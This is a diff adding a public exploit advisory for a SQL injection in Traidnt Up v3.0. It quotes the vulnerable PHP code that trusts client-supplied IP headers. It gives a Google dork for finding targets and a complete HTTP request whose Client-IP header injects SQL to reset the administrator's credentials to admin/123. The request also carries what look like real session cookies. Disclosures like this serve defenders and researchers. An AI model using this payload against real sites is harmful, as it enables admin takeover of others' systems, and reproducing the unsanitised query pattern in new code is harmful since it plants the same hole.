@@ -1,0 +1,55 @@
+# Exploit Title: Traidnt Up v3.0 SQL Injection
+# Google Dork: "Powered by TRAIDNT UP Version 3.0"
+# Date: 10-04-2015
+# Exploit Author: Ali Sami (ali.albakara@outlook.com)
+# Vendor Homepage: http://traidnt.net
+# Software Link: http://www.traidnt.net/vb/attachments/519880d1285278011-traidnt-up-v3.0.zip
+# Version: 3.0
+
+######### Vulnerable Code ############
+File: classUserdb.php
+    protected function doUpdateLastActive($username)
+    {
+
+        $this->_db->query("UPDATE `users` SET `lastactive` = '" . NOWTIME . "' WHERE `name` = '$username' LIMIT 1 ;");
+        $sql = "UPDATE `users` SET `lastip` 	   = '" . $this->getIpAddr() . "' WHERE `name` = '$username' LIMIT 1 ;";
+        echo $sql;
+        $this->_db->query($sql);
+
+    }
+
+    private function getIpAddr()
+    {
+        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+            $ip = $_SERVER['HTTP_CLIENT_IP'];
+        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        } else {
+            $ip = $_SERVER['REMOTE_ADDR'];
+        }
+        return $ip;
+    }
+######################################
+
+########## Explanation ###############
+getIpAddr function prioritizes untrusted user input entry (HTTP_CLIENT_IP & HTTP_X_FORWARDED_FOR) over the trusted one (REMOTE_ADDR) and does not sanitization 
+######################################
+
+########## Proof-of-concept ##########
+1. Register an account at the upload center
+2. Send a request that consists of an extra header (CLIENT-IP) which must contain the intended SQL to cp.php
+#######################################
+
+########## Request Example ###########
+GET /up/cp.php HTTP/1.1
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8,ar;q=0.6
+Cookie: PREF=ID=3a12b65d918b5ae2:U=45f515bf65b09574:FF=4:LD=en:TM=1427718041:LM=1428079570:GM=1:S=fKvs0s67_JroY23b; SID=DQAAABYBAAAXBPxKBeMSz09m3xCH23suPwacDFc9z5ZTI1ryFZK7qYLbSIB4zQXOmaYpafjcxlh6qaAHy-rPNZOPYjnLa-pW4Xly4-XIfNze1b1HCtrbf5Nm5pBrxOdoyeKsjg0-CvszxYHXgkzN7JcJc-1ujf4fHrEZNoSR9k_f2Qm7WX3mXd-8z_guk36_sve2sHN2_d7eeT_e5IQl43NcT5ID_YMNPXQPADss_k0kOraKLeZn7kUs3wox8ZanbvgMSM9O8lQ5oaP7CmtioaFpts1Aunqk43teWMS35YAP6_d9i65Sx32NJoCqGQpMs2pQiMvbxm10DlBixFJuwW1AitFrblnTUg06mgzqTzPLoPVJ_KlHRbeBys_VyJxnmUx1IrwQJzk; HSID=AQJUEVtf4qu2U_FTd; SSID=AN_8N-KoCnT18Clw5; APISID=IqdO-J-4tT4AtOR8/AQp8y6Nd19D86imDx; SAPISID=MMGr9eZKdxn4QieS/Ak36TdFaTbAMrcFGl; S=videobuying=MntGlNA3nRzvbhbjINLRMw; NID=67=TabAC6lMzTQywxlSyMcuCfGN3PSOxY0X3VV0jglmXfVhTEGrkhWyrhTxLDOUytsOKlLuRHJhAatM2tSk5BiAweIssYjppGFH3zGLklwMBFqMwZqlxEQANw-qJwh2Jri6G7fL68NA2PyDT6dPNc9iY_zPfNtQ4jQEHq0Rqio7vRYs_1aPsPWp_mzoWs9lZPps_dmCRWv76C6WvGdw8ZruV86ojr77-qIkjnpVQKAhH5aRDCTGNKFRZ5LIRZXOhw
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+X-Client-Data: CJK2yQEIpbbJAQiptskB
+Client-IP: 127.0.0.1', name='admin', password=md5('123') WHERE id = 1--
+
+** This request will update the administrator's username to (admin) and password to (123)
+######################################
+
+
